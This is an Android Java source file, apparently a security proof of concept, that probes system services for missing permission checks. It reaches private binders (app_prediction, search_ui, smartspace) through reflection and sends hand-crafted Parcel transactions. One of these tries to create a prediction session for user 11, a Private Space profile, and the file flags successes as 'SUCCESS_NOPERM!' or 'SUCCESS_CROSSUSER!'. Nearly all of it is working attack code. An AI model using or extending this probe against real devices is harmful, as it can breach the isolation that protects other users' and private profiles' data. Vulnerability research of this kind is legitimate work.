package com.poc.crossuser;

import android.content.ContentProvider;
import android.content.ContentValues;
import android.database.Cursor;
import android.database.MatrixCursor;
import android.net.Uri;
import android.os.IBinder;
import android.os.Parcel;
import java.lang.reflect.Method;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicReference;

public class PredictionProvider extends ContentProvider {

    @Override
    public boolean onCreate() { return true; }

    @Override
    public Cursor query(Uri uri, String[] proj, String sel, String[] selArgs, String sort) {
        MatrixCursor cursor = new MatrixCursor(new String[]{"test", "result"});
        cursor.addRow(new Object[]{"uid", String.valueOf(android.os.Process.myUid())});
        cursor.addRow(new Object[]{"userId", String.valueOf(android.os.Process.myUid() / 100000)});

        IBinder binder = getServiceBinder("app_prediction");
        if (binder == null) {
            cursor.addRow(new Object[]{"error", "no_binder"});
            return cursor;
        }

        String desc = "android.app.prediction.IPredictionManager";

        // TX=1: createPredictionSession(AppPredictionContext, AppPredictionSessionId, IBinder token)
        testCreateSession(binder, desc, cursor);

        // TX=5: registerPredictionUpdates
        testRegisterUpdates(binder, desc, cursor);

        // TX=4: requestPredictionUpdate
        testRequestUpdate(binder, desc, cursor);

        // Also test SearchUI and SmartSpace with correct params
        testSearchUI(cursor);
        testSmartSpaceCorrect(cursor);

        return cursor;
    }

    private void testCreateSession(IBinder binder, String desc, MatrixCursor cursor) {
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);

            // AppPredictionContext parcelable (writeTypedObject)
            data.writeInt(1); // non-null marker
            // AppPredictionContext fields:
            // Based on Parcelable pattern: writeString packageName, int numPredictedTargets, etc.
            data.writeString(getContext().getPackageName()); // mPackageName
            data.writeInt(5); // mPredictedTargetCount
            data.writeString("launcher"); // mUiSurface
            // Extras bundle
            data.writeInt(-1); // null bundle

            // AppPredictionSessionId parcelable (writeTypedObject)
            data.writeInt(1); // non-null marker
            // AppPredictionSessionId has: String mId, int mUserId
            data.writeString("poc_session_" + System.currentTimeMillis()); // mId
            data.writeInt(0); // mUserId = current user

            // IBinder token
            data.writeStrongBinder(new android.os.Binder());

            binder.transact(1, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                cursor.addRow(new Object[]{"createSession_u0", "SUCCESS_NOPERM!"});
            } else {
                String msg = reply.readString();
                cursor.addRow(new Object[]{"createSession_u0", "Ex=" + ex + "|" + truncate(msg)});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"createSession_u0", "ERR:" + e.toString()});
        }
        data.recycle();
        reply.recycle();

        // Try with user 11
        data = Parcel.obtain();
        reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeInt(1);
            data.writeString(getContext().getPackageName());
            data.writeInt(5);
            data.writeString("launcher");
            data.writeInt(-1);
            data.writeInt(1);
            data.writeString("poc_crossuser_session");
            data.writeInt(11); // user 11 (Private Space!)
            data.writeStrongBinder(new android.os.Binder());
            binder.transact(1, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                cursor.addRow(new Object[]{"createSession_u11", "SUCCESS_CROSSUSER!"});
            } else {
                String msg = reply.readString();
                cursor.addRow(new Object[]{"createSession_u11", "Ex=" + ex + "|" + truncate(msg)});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"createSession_u11", "ERR:" + e.toString()});
        }
        data.recycle();
        reply.recycle();
    }

    private void testRegisterUpdates(IBinder binder, String desc, MatrixCursor cursor) {
        final AtomicReference<String> cbResult = new AtomicReference<>("no_callback");
        final CountDownLatch latch = new CountDownLatch(1);

        IBinder callback = new android.os.Binder() {
            @Override
            protected boolean onTransact(int code, Parcel d, Parcel r, int flags) {
                cbResult.set("callback_code=" + code + "_size=" + d.dataSize());
                latch.countDown();
                if (r != null) r.writeNoException();
                return true;
            }
            @Override
            public String getInterfaceDescriptor() {
                return "android.app.prediction.IPredictionCallback";
            }
        };

        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            // registerPredictionUpdates(AppPredictionSessionId, IPredictionCallback)
            data.writeInt(1); // non-null SessionId
            data.writeString("poc_session_reg");
            data.writeInt(0); // userId
            data.writeStrongBinder(callback);
            binder.transact(5, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                cursor.addRow(new Object[]{"registerUpdates", "SUCCESS_NOPERM!"});
                boolean got = latch.await(2, TimeUnit.SECONDS);
                cursor.addRow(new Object[]{"registerUpdates_cb", got ? cbResult.get() : "timeout"});
            } else {
                String msg = reply.readString();
                cursor.addRow(new Object[]{"registerUpdates", "Ex=" + ex + "|" + truncate(msg)});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"registerUpdates", "ERR:" + e.toString()});
        }
        data.recycle();
        reply.recycle();
    }

    private void testRequestUpdate(IBinder binder, String desc, MatrixCursor cursor) {
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            // requestPredictionUpdate(AppPredictionSessionId)
            data.writeInt(1);
            data.writeString("poc_session_update");
            data.writeInt(0);
            binder.transact(4, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                cursor.addRow(new Object[]{"requestUpdate", "SUCCESS"});
            } else {
                String msg = reply.readString();
                cursor.addRow(new Object[]{"requestUpdate", "Ex=" + ex + "|" + truncate(msg)});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"requestUpdate", "ERR:" + e.toString()});
        }
        data.recycle();
        reply.recycle();
    }

    private void testSearchUI(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("search_ui");
        if (binder == null) return;
        String desc = "android.app.search.ISearchUiManager";

        // createSearchSession(SearchContext, SearchSessionId, IBinder)
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            // SearchContext parcelable
            data.writeInt(1);
            data.writeString(getContext().getPackageName());
            data.writeInt(0); // type
            // SearchSessionId parcelable
            data.writeInt(1);
            data.writeString("poc_search_session");
            data.writeInt(0); // userId
            // token
            data.writeStrongBinder(new android.os.Binder());
            binder.transact(1, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                cursor.addRow(new Object[]{"searchui_create_u0", "SUCCESS_NOPERM!"});
            } else {
                String msg = reply.readString();
                cursor.addRow(new Object[]{"searchui_create_u0", "Ex=" + ex + "|" + truncate(msg)});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"searchui_create_u0", "ERR:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();
    }

    private void testSmartSpaceCorrect(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("smartspace");
        if (binder == null) return;
        String desc = "android.app.smartspace.ISmartspaceManager";

        // createSmartspaceSession(SmartspaceConfig, SmartspaceSessionId, IBinder)
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            // SmartspaceConfig parcelable
            data.writeInt(1);
            data.writeString(getContext().getPackageName()); // packageName
            data.writeInt(1); // uiSurface type
            // SmartspaceSessionId parcelable
            data.writeInt(1);
            data.writeString("poc_smartspace_session");
            // UserHandle parcelable inside SessionId
            data.writeInt(1); // non-null
            data.writeInt(0); // userId = 0
            // IBinder token
            data.writeStrongBinder(new android.os.Binder());
            binder.transact(1, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                cursor.addRow(new Object[]{"smartspace_create_u0", "SUCCESS_NOPERM!"});
            } else {
                String msg = reply.readString();
                cursor.addRow(new Object[]{"smartspace_create_u0", "Ex=" + ex + "|" + truncate(msg)});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"smartspace_create_u0", "ERR:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();
    }

    private String truncate(String s) {
        if (s == null) return "null";
        return s.length() > 120 ? s.substring(0, 120) : s;
    }

    private IBinder getServiceBinder(String name) {
        try {
            Class<?> sm = Class.forName("android.os.ServiceManager");
            Method m = sm.getMethod("getService", String.class);
            return (IBinder) m.invoke(null, name);
        } catch (Exception e) {
            return null;
        }
    }

    @Override public String getType(Uri uri) { return null; }
    @Override public Uri insert(Uri uri, ContentValues values) { return null; }
    @Override public int delete(Uri uri, String sel, String[] selArgs) { return 0; }
    @Override public int update(Uri uri, ContentValues values, String sel, String[] selArgs) { return 0; }
}
